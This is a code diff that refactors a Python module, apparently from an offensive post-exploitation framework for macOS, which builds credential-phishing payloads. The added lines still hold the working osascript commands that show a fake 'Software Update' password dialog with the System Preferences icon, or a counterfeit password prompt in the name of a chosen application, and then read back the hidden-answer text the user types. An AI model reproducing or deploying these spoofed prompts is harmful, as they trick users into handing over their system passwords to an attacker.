@@ -85,10 +85,8 @@ class Module:
     def generate(self, obfuscate=False, obfuscationCommand=""):
 
         listApps = self.options['ListApps']['Value']
-        appName = self.options['AppName']['Value']
-        sandboxMode = self.options['SandboxMode']['Value']
         if listApps != "":
-            script = """
+            return """
 import os
 apps = [ app.split('.app')[0] for app in os.listdir('/Applications/') if not app.split('.app')[0].startswith('.')]
 choices = []
@@ -99,19 +97,17 @@ print "\\nAvailable applications:\\n"
 print '\\n'.join(choices)
 """
 
-        else:
-            if sandboxMode != "":
-                # osascript prompt for the current application with System Preferences icon
-                script = """
+        appName = self.options['AppName']['Value']
+        sandboxMode = self.options['SandboxMode']['Value']
+        return (
+            """
 import os
 print os.popen('osascript -e \\\'display dialog "Software Update requires that you type your password to apply changes." & return & return default answer "" with icon file "Applications:System Preferences.app:Contents:Resources:PrefApp.icns" with hidden answer with title "Software Update"\\\'').read()
 """
-
-            else:
-                # osascript prompt for the specific application
-                script = """
+            if sandboxMode != ""
+            else """
 import os
 print os.popen('osascript -e \\\'tell app "%s" to activate\\\' -e \\\'tell app "%s" to display dialog "%s requires your password to continue." & return  default answer "" with icon 1 with hidden answer with title "%s Alert"\\\'').read()
-""" % (appName, appName, appName, appName)
-
-        return script
+"""
+            % (appName, appName, appName, appName)
+        )
